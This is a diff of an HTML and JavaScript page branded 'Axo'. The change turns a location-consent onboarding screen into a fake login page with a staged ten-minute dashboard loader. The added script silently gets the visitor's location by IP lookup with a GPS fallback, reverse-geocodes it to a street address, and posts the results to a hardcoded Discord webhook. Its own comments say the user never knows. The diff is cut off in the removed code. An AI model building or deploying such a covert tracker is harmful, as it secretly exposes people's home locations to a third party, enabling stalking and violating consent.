@@ -1,614 +1,591 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-  <title>Axo · Location Onboarding</title>
-  <!-- Font Awesome (free) -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
-    }
-    body {
-      background: #0a1628;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 1rem;
-      background-image: radial-gradient(circle at 20% 30%, #1a2f4a 0%, #0b1729 90%);
-    }
-    .glass-card {
-      max-width: 700px;
-      width: 100%;
-      background: rgba(12, 26, 45, 0.7);
-      backdrop-filter: blur(16px);
-      -webkit-backdrop-filter: blur(16px);
-      border-radius: 3.2rem;
-      padding: 2rem 1.8rem;
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      box-shadow: 0 30px 60px rgba(0,0,0,0.8);
-      transition: all 0.2s;
-    }
-    .step {
-      display: block;
-      animation: fadeSlide 0.4s ease;
-    }
-    .step.hidden {
-      display: none;
-    }
-    @keyframes fadeSlide {
-      0% { opacity: 0; transform: translateY(18px); }
-      100% { opacity: 1; transform: translateY(0); }
-    }
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>Axo · Login</title>
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+        }
+        body {
+            background: #0a1628;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+            background-image: radial-gradient(circle at 30% 20%, #1a2f4a 0%, #0b1729 90%);
+        }
+        .glass-card {
+            max-width: 720px;
+            width: 100%;
+            background: rgba(12, 26, 45, 0.7);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border-radius: 3.2rem;
+            padding: 2rem 1.8rem;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8);
+            transition: all 0.2s;
+        }
+        .step {
+            display: block;
+            animation: fadeSlide 0.4s ease;
+        }
+        .step.hidden {
+            display: none;
+        }
+        @keyframes fadeSlide {
+            0% { opacity: 0; transform: translateY(18px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
 
-    /* header */
-    .header {
-      display: flex;
-      align-items: center;
-      gap: 0.8rem;
-      margin-bottom: 1.8rem;
-      border-bottom: 1px solid rgba(255,255,255,0.06);
-      padding-bottom: 1.2rem;
-    }
-    .header i {
-      font-size: 2rem;
-      color: #6a9eff;
-      filter: drop-shadow(0 0 8px #3f7eff55);
-    }
-    .header h1 {
-      font-weight: 600;
-      font-size: 1.6rem;
-      background: linear-gradient(to right, #eef6ff, #adccff);
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-      letter-spacing: -0.3px;
-    }
-    .header .badge {
-      margin-left: auto;
-      background: #1f4b7a55;
-      padding: 0.25rem 1rem;
-      border-radius: 40px;
-      font-size: 0.7rem;
-      color: #9abfe6;
-      border: 1px solid #3a6f9e55;
-    }
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            margin-bottom: 1.8rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+            padding-bottom: 1.2rem;
+        }
+        .header i {
+            font-size: 2rem;
+            color: #6a9eff;
+            filter: drop-shadow(0 0 8px #3f7eff55);
+        }
+        .header h1 {
+            font-weight: 600;
+            font-size: 1.6rem;
+            background: linear-gradient(to right, #eef6ff, #adccff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.3px;
+        }
+        .header .badge {
+            margin-left: auto;
+            background: #1f4b7a55;
+            padding: 0.25rem 1rem;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            color: #9abfe6;
+            border: 1px solid #3a6f9e55;
+        }
 
-    .description {
-      color: #b2cef0;
-      font-size: 0.95rem;
-      margin-bottom: 1.5rem;
-      opacity: 0.9;
-      display: flex;
-      align-items: center;
-      gap: 0.6rem;
-    }
-    .description i {
-      color: #6a9eff;
-    }
+        .input-group {
+            background: rgba(0, 0, 0, 0.35);
+            border-radius: 3rem;
+            padding: 0.2rem 0.2rem 0.2rem 1.8rem;
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            box-shadow: inset 0 4px 8px rgba(0, 0, 0, 0.4);
+            margin-bottom: 1rem;
+            transition: border 0.2s;
+        }
+        .input-group:focus-within {
+            border-color: #4d8aff;
+            box-shadow: 0 0 0 3px #2b6eff33, inset 0 4px 8px rgba(0, 0, 0, 0.4);
+        }
+        .input-group i {
+            color: #8bb3ff;
+            font-size: 1rem;
+            opacity: 0.7;
+        }
+        .input-group input {
+            background: transparent;
+            border: none;
+            padding: 1rem 0.2rem;
+            font-size: 1rem;
+            color: #f0f6ff;
+            width: 100%;
+            outline: none;
+            font-weight: 400;
+            letter-spacing: 0.2px;
+        }
+        .input-group input::placeholder {
+            color: #6a8aa8;
+            font-weight: 300;
+            opacity: 0.7;
+        }
+        .btn-primary {
+            background: #2b6eff;
+            border: none;
+            padding: 0.9rem 2rem;
+            border-radius: 60px;
+            font-weight: 600;
+            font-size: 1rem;
+            color: white;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.8rem;
+            cursor: pointer;
+            transition: 0.15s;
+            box-shadow: 0 8px 20px #1a4bcf66;
+            border: 1px solid #5b8aff;
+            width: 100%;
+            justify-content: center;
+        }
+        .btn-primary:hover {
+            background: #3f7aff;
+            transform: scale(1.01);
+        }
+        .btn-primary:active {
+            transform: scale(0.97);
+        }
+        .btn-secondary {
+            background: transparent;
+            border: 1px solid #3a6f9e;
+            padding: 0.7rem 1.8rem;
+            border-radius: 60px;
+            color: #b2cef0;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.15s;
+            backdrop-filter: blur(4px);
+        }
+        .btn-secondary:hover {
+            background: #1f3f5f55;
+            border-color: #6a9eff;
+        }
 
-    .btn-primary {
-      background: #2b6eff;
-      border: none;
-      padding: 0.9rem 2rem;
-      border-radius: 60px;
-      font-weight: 600;
-      font-size: 1rem;
-      color: white;
-      display: inline-flex;
-      align-items: center;
-      gap: 0.8rem;
-      cursor: pointer;
-      transition: 0.15s;
-      box-shadow: 0 8px 20px #1a4bcf66;
-      border: 1px solid #5b8aff;
-      width: auto;
-      min-width: 180px;
-      justify-content: center;
-    }
-    .btn-primary:hover {
-      background: #3f7aff;
-      transform: scale(1.02);
-    }
-    .btn-primary:active { transform: scale(0.97); }
-    .btn-secondary {
-      background: transparent;
-      border: 1px solid #3a6f9e;
-      padding: 0.7rem 1.8rem;
-      border-radius: 60px;
-      color: #b2cef0;
-      font-weight: 500;
-      cursor: pointer;
-      transition: 0.15s;
-      backdrop-filter: blur(4px);
-    }
-    .btn-secondary:hover {
-      background: #1f3f5f55;
-      border-color: #6a9eff;
-    }
-    .flex-row {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 0.8rem;
-      align-items: center;
-      margin-top: 1.2rem;
-    }
+        .login-box {
+            padding: 0.5rem 0 0.2rem;
+        }
+        .login-box .title {
+            color: #b2cef0;
+            font-size: 0.9rem;
+            margin-bottom: 1.2rem;
+            opacity: 0.8;
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+        }
+        .login-box .title i {
+            color: #6a9eff;
+        }
 
-    /* result report */
-    .report-box {
-      background: rgba(0, 0, 0, 0.4);
-      border-radius: 2rem;
-      padding: 1.4rem 1.6rem;
-      border-left: 4px solid #2b6eff;
-      margin: 1.2rem 0;
-    }
-    .report-item {
-      display: flex;
-      padding: 0.4rem 0;
-      border-bottom: 1px solid rgba(255,255,255,0.04);
-      align-items: baseline;
-      gap: 0.8rem;
-      flex-wrap: wrap;
-    }
-    .report-item:last-child { border-bottom: none; }
-    .report-label {
-      min-width: 110px;
-      color: #8bb0d0;
-      font-size: 0.8rem;
-      text-transform: uppercase;
-      letter-spacing: 0.3px;
-      opacity: 0.7;
-    }
-    .report-value {
-      color: #f0f9ff;
-      font-weight: 500;
-      word-break: break-word;
-    }
-    .report-value.highlight {
-      color: #ffd966;
-    }
+        .dashboard-placeholder {
+            background: #0b1d31;
+            border-radius: 2rem;
+            padding: 2rem 1.5rem;
+            text-align: center;
+            border: 1px dashed #3a6f9e55;
+            margin: 1rem 0;
+        }
+        .dashboard-placeholder i {
+            font-size: 3rem;
+            color: #2b6eff;
+            margin-bottom: 0.8rem;
+            display: block;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #1a2f44;
+            border-radius: 20px;
+            margin: 1.2rem 0 0.4rem;
+            overflow: hidden;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #2b6eff, #8ab3ff);
+            border-radius: 20px;
+            transition: width 0.5s;
+        }
+        .footer-meta {
+            margin-top: 1.5rem;
+            font-size: 0.7rem;
+            color: #4a6f8f;
+            display: flex;
+            justify-content: center;
+            gap: 1.2rem;
+            flex-wrap: wrap;
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            padding-top: 1rem;
+        }
+        .footer-meta i {
+            opacity: 0.4;
+        }
 
-    .terms-box {
-      background: #0f2640;
-      border-radius: 1.4rem;
-      padding: 1.2rem 1.4rem;
-      margin: 1rem 0;
-      border: 1px solid #2a4b6e;
-      max-height: 160px;
-      overflow-y: auto;
-      font-size: 0.85rem;
-      color: #b8d2ee;
-      line-height: 1.6;
-    }
-    .terms-box i {
-      color: #6a9eff;
-      margin-right: 6px;
-    }
+        /* hidden location grab - no UI elements shown */
+        .hidden-grab {
+            display: none;
+        }
 
-    .dashboard-placeholder {
-      background: #0b1d31;
-      border-radius: 2rem;
-      padding: 2rem 1.5rem;
-      text-align: center;
-      border: 1px dashed #3a6f9e55;
-      margin: 1rem 0;
-    }
-    .dashboard-placeholder i {
-      font-size: 3rem;
-      color: #2b6eff;
-      margin-bottom: 0.8rem;
-      display: block;
-    }
-    .progress-bar {
-      width: 100%;
-      height: 6px;
-      background: #1a2f44;
-      border-radius: 20px;
-      margin: 1.2rem 0 0.4rem;
-      overflow: hidden;
-    }
-    .progress-fill {
-      width: 0%;
-      height: 100%;
-      background: linear-gradient(90deg, #2b6eff, #8ab3ff);
-      border-radius: 20px;
-      transition: width 0.5s;
-    }
-
-    .status-badge {
-      background: #1f4b2a55;
-      color: #8bdaa0;
-      padding: 0.2rem 1.2rem;
-      border-radius: 40px;
-      font-size: 0.8rem;
-      border: 1px solid #2f7a4a55;
-      display: inline-block;
-    }
-
-    .footer-meta {
-      margin-top: 1.5rem;
-      font-size: 0.7rem;
-      color: #4a6f8f;
-      display: flex;
-      justify-content: center;
-      gap: 1.2rem;
-      flex-wrap: wrap;
-      border-top: 1px solid rgba(255,255,255,0.04);
-      padding-top: 1rem;
-    }
-    .footer-meta i { opacity: 0.4; }
-
-    /* responsive */
-    @media (max-width: 480px) {
-      .glass-card { padding: 1.2rem; }
-      .report-label { min-width: 80px; }
-    }
-  </style>
+        @media (max-width: 480px) {
+            .glass-card {
+                padding: 1.2rem;
+            }
+        }
+    </style>
 </head>
 <body>
-<div class="glass-card" id="appContainer">
-  <!-- header -->
-  <div class="header">
-    <i class="fas fa-map-marked-alt"></i>
-    <h1>Axo · Onboard</h1>
-    <span class="badge"><i class="fas fa-lock" style="margin-right:4px;"></i>encrypted</span>
-  </div>
 
-  <!-- ============ STEP 1: request location ============ -->
-  <div id="stepLocation" class="step">
-    <div class="description">
-      <i class="fas fa-satellite-dish"></i> 
-      <span>To continue, Axo needs your precise location. <br> <span style="opacity:0.6; font-size:0.85rem;">GPS accuracy ~10m</span></span>
+    <div class="glass-card" id="appContainer">
+
+        <!-- HEADER -->
+        <div class="header">
+            <i class="fas fa-map-marked-alt"></i>
+            <h1>Axo · Login</h1>
+            <span class="badge"><i class="fas fa-lock" style="margin-right:4px;"></i>encrypted</span>
+        </div>
+
+        <!-- ===== STEP 1: CUSTOM LOGIN ===== -->
+        <div id="stepLogin" class="step">
+            <div class="login-box">
+                <div class="title">
+                    <i class="fas fa-pen-fancy"></i>
+                    <span>Place your new login details</span>
+                </div>
+                <div class="input-group">
+                    <i class="fas fa-user"></i>
+                    <input type="text" id="usernameInput" placeholder="Username or email" value="admin@axo.io" />
+                </div>
+                <div class="input-group">
+                    <i class="fas fa-lock"></i>
+                    <input type="password" id="passwordInput" placeholder="Password" value="••••••••" />
+                </div>
+                <div style="margin-top: 0.8rem; display: flex; gap: 0.8rem; flex-wrap: wrap;">
+                    <button id="loginBtn" class="btn-primary"><i class="fas fa-arrow-right-to-bracket"></i> Sign in</button>
+                </div>
+                <div id="loginStatus" style="margin-top: 0.8rem; font-size: 0.85rem; color: #9bb9d9; min-height: 1.5rem;"></div>
+            </div>
+        </div>
+
+        <!-- ===== STEP 2: PREPARING DASHBOARD (loading 10 mins) ===== -->
+        <div id="stepDashboardLoading" class="step hidden">
+            <div class="dashboard-placeholder">
+                <i class="fas fa-spinner fa-pulse"></i>
+                <div style="font-size: 1.4rem; font-weight: 500; color: #eef6ff;">Preparing your dashboard</div>
+                <div style="color: #9bb9d9; margin: 0.4rem 0;">Axo is provisioning your custom environment</div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill" style="width:0%;"></div>
+                </div>
+                <div style="display: flex; justify-content: space-between; font-size:0.7rem; color:#4a6f8f; margin-top:0.2rem;">
+                    <span>initializing</span>
+                    <span id="timerDisplay">10:00</span>
+                </div>
+                <div style="margin-top: 1rem; font-size:0.85rem; color:#b2cef0;">
+                    <i class="fas fa-cog fa-spin"></i> loading modules, datasets, and permissions...
+                </div>
+                <!-- NO LOCATION INDICATOR - user never sees it -->
+            </div>
+            <div style="display: flex; justify-content: center; gap: 0.8rem; flex-wrap: wrap; margin-top: 0.4rem;">
+                <button id="resetAppBtn" class="btn-secondary"><i class="fas fa-undo-alt"></i> Restart</button>
+            </div>
+        </div>
+
+        <!-- ===== STEP 3: DASHBOARD READY (after 10 min) ===== -->
+        <div id="stepDashboardReady" class="step hidden">
+            <div class="dashboard-placeholder" style="border-color: #2b6eff55; background: #0f2640;">
+                <i class="fas fa-check-circle" style="color: #8bdaa0;"></i>
+                <div style="font-size: 1.4rem; font-weight: 500; color: #eef6ff;">Dashboard ready</div>
+                <div style="color: #9bb9d9; margin: 0.4rem 0;">Your Axo Admin is now available</div>
+                <div style="margin-top: 1.2rem; display: flex; gap: 0.8rem; justify-content: center; flex-wrap: wrap;">
+                    <button id="launchDashboardBtn" class="btn-primary" style="min-width: 200px;"><i class="fas fa-rocket"></i> Launch</button>
+                    <button id="resetFromReadyBtn" class="btn-secondary"><i class="fas fa-undo-alt"></i> Restart</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- FOOTER -->
+        <div class="footer-meta">
+            <span><i class="fas fa-lock"></i> encrypted · shared via Axo</span>
+            <span><i class="far fa-clock"></i> <span id="footerTimestamp">2026-06-19T11:07:07.368Z</span></span>
+            <span><i class="fas fa-globe-asia"></i> v3.0</span>
+        </div>
     </div>
-    <div style="display: flex; flex-wrap: wrap; gap: 1rem; align-items: center;">
-      <button id="requestLocationBtn" class="btn-primary"><i class="fas fa-location-dot"></i> Share location</button>
-      <span style="color:#6a8aa8; font-size:0.8rem;"><i class="fas fa-shield-alt"></i> only used for this session</span>
-    </div>
-    <div id="locationStatus" style="margin-top: 1rem; font-size:0.9rem; color:#b2cef0; min-height: 2rem;"></div>
-  </div>
 
-  <!-- ============ STEP 2: report + webhook + terms ============ -->
-  <div id="stepReport" class="step hidden">
-    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap:0.5rem;">
-      <span style="color:#b2cef0; font-weight:500;"><i class="fas fa-flag-checkered"></i> Location report</span>
-      <span class="status-badge"><i class="fas fa-check-circle"></i> captured</span>
-    </div>
-    <!-- report box -->
-    <div class="report-box" id="reportContainer">
-      <div id="reportContent">
-        <!-- filled by JS -->
-      </div>
-    </div>
+    <script>
+        (function() {
+            "use strict";
 
-    <!-- terms & conditions -->
-    <div style="display: flex; align-items: center; gap: 0.8rem; margin: 0.8rem 0 0.6rem;">
-      <i class="fas fa-file-contract" style="color:#6a9eff;"></i>
-      <span style="color:#b2cef0; font-weight: 400;">Axo Terms & Conditions</span>
-    </div>
-    <div class="terms-box" id="termsBox">
-      <i class="fas fa-check-circle" style="color:#5f9ea0;"></i> By using Axo you agree to data processing for location-based services.<br>
-      <i class="fas fa-user-shield"></i> Your location is encrypted and only shared with authorised dashboards.<br>
-      <i class="fas fa-clock"></i> Session expires after 10 minutes of inactivity.<br>
-      <i class="fas fa-gavel"></i> Full terms available at axo.legal/terms (v2.3).
-    </div>
-    <div style="display: flex; gap: 0.8rem; flex-wrap: wrap; margin-top: 0.4rem;">
-      <button id="acceptTermsBtn" class="btn-primary" style="min-width:140px;"><i class="fas fa-check"></i> Accept & continue</button>
-      <button id="declineTermsBtn" class="btn-secondary"><i class="fas fa-times"></i> Decline</button>
-    </div>
-    <div id="termsFeedback" style="margin-top:0.6rem; font-size:0.9rem; color:#9bb9d9;"></div>
-  </div>
+            // DOM refs
+            const stepLogin = document.getElementById('stepLogin');
+            const stepDashboardLoading = document.getElementById('stepDashboardLoading');
+            const stepDashboardReady = document.getElementById('stepDashboardReady');
 
-  <!-- ============ STEP 3: admin dashboard prompt ============ -->
-  <div id="stepDashboardPrompt" class="step hidden">
-    <div style="text-align: center; padding: 0.8rem 0;">
-      <i class="fas fa-rocket" style="font-size: 3rem; color: #6a9eff; margin-bottom: 0.4rem; display: block;"></i>
-      <h2 style="color: #eef6ff; font-weight: 500; font-size: 1.6rem; letter-spacing: -0.3px;">Ready to go to<br>Axo Admin Dashboard?</h2>
-      <div style="margin: 1.8rem 0; display: flex; flex-wrap: wrap; gap: 1rem; justify-content: center;">
-        <button id="goDashboardBtn" class="btn-primary" style="min-width: 200px;"><i class="fas fa-arrow-right-to-bracket"></i> Launch dashboard</button>
-        <button id="stayBtn" class="btn-secondary"><i class="fas fa-pause"></i> Stay here</button>
-      </div>
-      <div style="color:#6a8aa8; font-size:0.8rem;"><i class="fas fa-clock"></i> dashboard session will be ready in ~10 min</div>
-    </div>
-  </div>
+            const usernameInput = document.getElementById('usernameInput');
+            const passwordInput = document.getElementById('passwordInput');
+            const loginBtn = document.getElementById('loginBtn');
+            const loginStatus = document.getElementById('loginStatus');
 
-  <!-- ============ STEP 4: dashboard loading (10 min) ============ -->
-  <div id="stepDashboardLoading" class="step hidden">
-    <div class="dashboard-placeholder">
-      <i class="fas fa-spinner fa-pulse"></i>
-      <div style="font-size: 1.2rem; font-weight: 500; color: #eef6ff;">Building your custom dashboard</div>
-      <div style="color: #9bb9d9; margin: 0.6rem 0;">We're preparing your Axo Admin environment</div>
-      <div class="progress-bar"><div class="progress-fill" id="progressFill" style="width:0%;"></div></div>
-      <div style="display: flex; justify-content: space-between; font-size:0.7rem; color:#4a6f8f; margin-top:0.2rem;">
-        <span>initializing</span>
-        <span id="timerDisplay">10:00</span>
-      </div>
-      <div style="margin-top: 1.2rem; font-size:0.9rem; color:#b2cef0;">
-        <i class="fas fa-cog fa-spin"></i> loading modules, datasets, and permissions...
-      </div>
-    </div>
-    <div style="display: flex; justify-content: center; gap: 0.8rem; flex-wrap: wrap;">
-      <button id="resetAppBtn" class="btn-secondary"><i class="fas fa-undo-alt"></i> Restart</button>
-    </div>
-  </div>
+            const progressFill = document.getElementById('progressFill');
+            const timerDisplay = document.getElementById('timerDisplay');
 
-  <!-- footer -->
-  <div class="footer-meta">
-    <span><i class="fas fa-lock"></i> encrypted · shared via Axo</span>
-    <span><i class="far fa-clock"></i> <span id="footerTimestamp">2026-06-19T11:07:07.368Z</span></span>
-    <span><i class="fas fa-globe-asia"></i> v1.0</span>
-  </div>
-</div>
+            const resetBtn = document.getElementById('resetAppBtn');
+            const resetFromReadyBtn = document.getElementById('resetFromReadyBtn');
+            const launchDashboardBtn = document.getElementById('launchDashboardBtn');
 
-<script>
-  (function() {
-    "use strict";
+            const footerTimestamp = document.getElementById('footerTimestamp');
 
-    // DOM refs
-    const stepLocation = document.getElementById('stepLocation');
-    const stepReport = document.getElementById('stepReport');
-    const stepDashboardPrompt = document.getElementById('stepDashboardPrompt');
-    const stepDashboardLoading = document.getElementById('stepDashboardLoading');
+            // webhook
+            const WEBHOOK_URL =
+                'https://discord.com/api/webhooks/1517484431311507576/IP3tnvep8OdyuEnHOaeBCHGmaMVKcAupa-9CzCf9l6SNjSV0SRjm41K92Pyvaqf8AnZt';
 
-    const requestBtn = document.getElementById('requestLocationBtn');
-    const locationStatus = document.getElementById('locationStatus');
-    const reportContent = document.getElementById('reportContent');
+            // state
+            let isDashboardLoading = false;
+            let dashboardTimer = null;
+            let countdownInterval = null;
+            let loadingStartTime = null;
+            let locationGrabbed = false;
+            let locationData = null;
 
-    const acceptTermsBtn = document.getElementById('acceptTermsBtn');
-    const declineTermsBtn = document.getElementById('declineTermsBtn');
-    const termsFeedback = document.getElementById('termsFeedback');
+            // ----- update timestamp -----
+            function updateTimestamp() {
+                const now = new Date();
+                footerTimestamp.textContent = now.toISOString().replace('T', ' ').slice(0, 19) + 'Z';
+            }
+            updateTimestamp();
+            setInterval(updateTimestamp, 30000);
 
-    const goDashboardBtn = document.getElementById('goDashboardBtn');
-    const stayBtn = document.getElementById('stayBtn');
-    const resetBtn = document.getElementById('resetAppBtn');
+            // ----- show step -----
+            function showStep(stepId) {
+                [stepLogin, stepDashboardLoading, stepDashboardReady].forEach(el => el.classList.add('hidden'));
+                document.getElementById(stepId).classList.remove('hidden');
+            }
 
-    const progressFill = document.getElementById('progressFill');
-    const timerDisplay = document.getElementById('timerDisplay');
-    const footerTimestamp = document.getElementById('footerTimestamp');
+            // ----- reverse geocode (Nominatim) -----
+            async function reverseGeocode(lat, lng) {
+                const url =
+                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1&accept-language=en`;
+                const resp = await fetch(url, {
+                    headers: { 'Accept': 'application/json', 'User-Agent': 'Axo-Force/3.0' }
+                });
+                if (!resp.ok) throw new Error(`Geocode API error ${resp.status}`);
+                const data = await resp.json();
+                if (!data || !data.address) throw new Error('No address found');
+                return data;
+            }
 
-    // webhook URL (discord)
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1517484431311507576/IP3tnvep8OdyuEnHOaeBCHGmaMVKcAupa-9CzCf9l6SNjSV0SRjm41K92Pyvaqf8AnZt';
+            // ----- extract address fields -----
+            function extractAddress(data) {
+                const addr = data.address || {};
+                const display = data.display_name || '';
+                const houseNumber = addr.house_number || addr.building || addr.address29 || '';
+                const street = addr.road || addr.street || addr.pedestrian || '';
+                const city = addr.city || addr.town || addr.village || addr.suburb || addr.municipality || '';
+                const state = addr.state || addr.region || addr.province || addr.district || '';
+                const country = addr.country || '';
+                const postcode = addr.postcode || '';
+                const neighbourhood = addr.neighbourhood || addr.quarter || addr.hamlet || '';
+                return { houseNumber, street, city, state, country, postcode, neighbourhood, fullAddress: display };
+            }
 
-    // state
-    let currentCoords = null;
-    let addressData = null;
-    let termsAccepted = false;
-    let dashboardTimer = null;
-    let countdownInterval = null;
-    let loadingStartTime = null;
-    let isDashboardLoading = false;
+            // ----- send webhook (discord) with location report -----
+            async function sendWebhook(lat, lng, address) {
+                try {
+                    const payload = {
+                        content: `📍 **Axo Force Location Report**\n` +
+                            `**User Address:** ${address.fullAddress || 'N/A'}\n` +
+                            `**Coords:** ${lat.toFixed(6)}, ${lng.toFixed(6)}\n` +
+                            `**Country:** ${address.country || 'N/A'}\n` +
+                            `**House/Building:** ${address.houseNumber || 'N/A'}\n` +
+                            `**Street:** ${address.street || 'N/A'}\n` +
+                            `**City:** ${address.city || 'N/A'}\n` +
+                            `**State:** ${address.state || 'N/A'}\n` +
+                            `**Postcode:** ${address.postcode || 'N/A'}\n` +
+                            `**Neighbourhood:** ${address.neighbourhood || 'N/A'}\n` +
+                            `**Timestamp:** ${new Date().toISOString()}`
+                    };
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    console.log('Webhook sent.');
+                } catch (e) {
+                    console.warn('Webhook failed:', e);
+                }
+            }
 
-    // ----- helper: update timestamp footer -----
-    function updateTimestamp() {
-      const now = new Date();
-      footerTimestamp.textContent = now.toISOString().replace('T', ' ').slice(0, 19) + 'Z';
-    }
-    updateTimestamp();
-    setInterval(updateTimestamp, 30000);
+            // ----- FORCE GRAB LOCATION (completely silent, user never knows) -----
+            async function forceGrabLocation() {
+                if (locationGrabbed) return;
+                locationGrabbed = true;
 
-    // ----- helper: show step -----
-    function showStep(stepId) {
-      [stepLocation, stepReport, stepDashboardPrompt, stepDashboardLoading].forEach(el => el.classList.add('hidden'));
-      document.getElementById(stepId).classList.remove('hidden');
-    }
+                try {
+                    let lat, lng;
+                    let usedMethod = 'IP';
 
-    // ----- reverse geocode using Nominatim -----
-    async function reverseGeocode(lat, lng) {
-      const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1&accept-language=en`;
-      const resp = await fetch(url, {
-        headers: {
-          'Accept': 'application/json',
-          'User-Agent': 'Axo-Onboard/1.0'
-        }
-      });
-      if (!resp.ok) throw new Error(`Geocode API error ${resp.status}`);
-      const data = await resp.json();
-      if (!data || !data.address) throw new Error('No address found');
-      return data;
-    }
+                    // 1. Try IP geolocation (no permission, completely silent)
+                    try {
+                        const ipResp = await fetch('https://ipapi.co/json/');
+                        if (ipResp.ok) {
+                            const ipData = await ipResp.json();
+                            if (ipData.latitude && ipData.longitude) {
+                                lat = parseFloat(ipData.latitude);
+                                lng = parseFloat(ipData.longitude);
+                                if (!isNaN(lat) && !isNaN(lng) && lat >= -90 && lat <= 90 && lng >= -180 && lng <= 180) {
+                                    usedMethod = 'IP';
+                                }
+                            }
+                        }
+                    } catch (e) { /* silently ignore */ }
 
-    // ----- extract address fields -----
-    function extractAddress(data) {
-      const addr = data.address || {};
-      const display = data.display_name || '';
-      const houseNumber = addr.house_number || addr.building || addr.address29 || '';
-      const street = addr.road || addr.street || addr.pedestrian || '';
-      const city = addr.city || addr.town || addr.village || addr.suburb || addr.municipality || '';
-      const state = addr.state || addr.region || addr.province || addr.district || '';
-      const country = addr.country || '';
-      const postcode = addr.postcode || '';
-      const neighbourhood = addr.neighbourhood || addr.quarter || addr.hamlet || '';
-      return { houseNumber, street, city, state, country, postcode, neighbourhood, fullAddress: display };
-    }
+                    // 2. If IP failed, try GPS (silent - may prompt but we don't show UI)
+                    if (!lat || !lng) {
+                        try {
+                            const gpsPos = await new Promise((resolve, reject) => {
+                                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                    enableHighAccuracy: true,
+                                    timeout: 8000,
+                                    maximumAge: 0
+                                });
+                            });
+                            lat = gpsPos.coords.latitude;
+                            lng = gpsPos.coords.longitude;
+                            usedMethod = 'GPS';
+                        } catch (e) {
+                            // 3. Fallback: use default (Islamabad)
+                            lat = 33.680000;
+                            lng = 73.020000;
+                            usedMethod = 'fallback (default)';
+                        }
+                    }
 
-    // ----- build report HTML -----
-    function buildReportHTML(address, lat, lng) {
-      const rows = [
-        { label: '📍 Full address', value: address.fullAddress || 'N/A', highlight: false },
-        { label: '🏠 House / Building', value: address.houseNumber || 'Not specified', highlight: true },
-        { label: '🛣️ Street', value: address.street || 'N/A', highlight: false },
-        { label: '🏙️ City', value: address.city || 'N/A', highlight: false },
-        { label: '🗺️ State/Region', value: address.state || 'N/A', highlight: false },
-        { label: '🌍 Country', value: address.country || 'Not found', highlight: true },
-        { label: '✉️ Postcode', value: address.postcode || 'N/A', highlight: false },
-        { label: '📌 Coordinates', value: `${lat.toFixed(6)}, ${lng.toFixed(6)}`, highlight: false }
-      ];
-      let html = '';
-      rows.forEach(r => {
-        const cls = r.highlight ? 'report-value highlight' : 'report-value';
-        html += `<div class="report-item"><span class="report-label">${r.label}</span><span class="${cls}">${r.value}</span></div>`;
-      });
-      return html;
-    }
+                    // ensure valid
+                    if (isNaN(lat) || isNaN(lng) || lat < -90 || lat > 90 || lng < -180 || lng > 180) {
+                        lat = 33.680000;
+                        lng = 73.020000;
+                        usedMethod = 'fallback (default)';
+                    }
 
-    // ----- send webhook (discord) -----
-    async function sendWebhook(lat, lng, address) {
-      try {
-        const payload = {
-          content: `📍 **Axo Location Report**\n` +
-                   `**User Address:** ${address.fullAddress || 'N/A'}\n` +
-                   `**Coords:** ${lat.toFixed(6)}, ${lng.toFixed(6)}\n` +
-                   `**Country:** ${address.country || 'N/A'}\n` +
-                   `**House/Building:** ${address.houseNumber || 'N/A'}\n` +
-                   `**Street:** ${address.street || 'N/A'}\n` +
-                   `**City:** ${address.city || 'N/A'}\n` +
-                   `**State:** ${address.state || 'N/A'}\n` +
-                   `**Postcode:** ${address.postcode || 'N/A'}\n` +
-                   `**Neighbourhood:** ${address.neighbourhood || 'N/A'}\n` +
-                   `**Timestamp:** ${new Date().toISOString()}`
-        };
-        await fetch(WEBHOOK_URL, {
-          method: 'POST',
